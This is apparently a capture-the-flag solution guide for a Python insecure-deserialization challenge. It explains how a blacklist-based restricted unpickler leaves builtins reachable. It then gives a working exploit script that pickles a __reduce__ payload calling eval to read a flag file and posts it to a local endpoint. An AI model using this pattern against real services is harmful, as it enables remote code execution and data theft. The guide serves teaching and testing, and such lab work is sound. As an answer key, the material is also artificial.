# A08 Hard: Solution Guide

### Vulnerability Analysis
The server's custom `RestrictedUnpickler` implements a naive module blacklist:
```python
BLOCKED_MODULES = {'os', 'subprocess', 'posix', 'sys', 'commands'}
```
It does not restrict the `builtins` module. As a result, Python built-in functions such as `eval`, `exec`, or `compile` are permitted by the classloader.

### Exploitation Steps
1. Define a malicious Python class with a `__reduce__` method returning `eval` and an execution payload:
   ```python
   class Exploit:
       def __reduce__(self):
           payload = "__import__('builtins').open('/flag.txt').read() if __import__('os').path.exists('/flag.txt') else __import__('builtins').open('flag.txt').read()"
           return (eval, (payload,))
   ```
2. Serialize the object with `pickle.dumps(Exploit())` and encode to Base64.
3. Submit the token to `POST /pipeline/import`.
4. The server unpickles the object, invokes `eval()`, and displays the resulting flag in the template response.

### Exploit Script
```python
import base64
import pickle
import requests
import re

BASE_URL = "http://127.0.0.1:6024"

class Exploit:
    def __reduce__(self):
        code = "__import__('builtins').open('/flag.txt').read() if __import__('os').path.exists('/flag.txt') else __import__('builtins').open('flag.txt').read()"
        return (eval, (code,))

# Generate serialized payload
payload_b64 = base64.b64encode(pickle.dumps(Exploit())).decode('utf-8')

# Send to import endpoint
resp = requests.post(f"{BASE_URL}/pipeline/import", data={"payload": payload_b64})

# Extract flag
flag = re.search(r"RTSA\{[^}]+\}", resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
